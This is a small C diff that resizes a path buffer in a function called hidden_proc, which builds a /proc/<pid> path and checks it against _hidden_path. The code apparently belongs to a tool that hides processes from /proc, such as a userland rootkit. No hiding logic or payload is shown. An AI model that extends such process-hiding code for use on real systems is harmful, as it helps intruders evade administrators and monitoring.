@@ -31,7 +31,7 @@ int hidden_proc(pid_t pid){
 #ifndef HIDE_SELF
     return 0;
 #endif
-    char proc_path[256];
+    char proc_path[7 + PID_MAXLEN];
     snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
     return _hidden_path(proc_path, MODE_REG);
 }
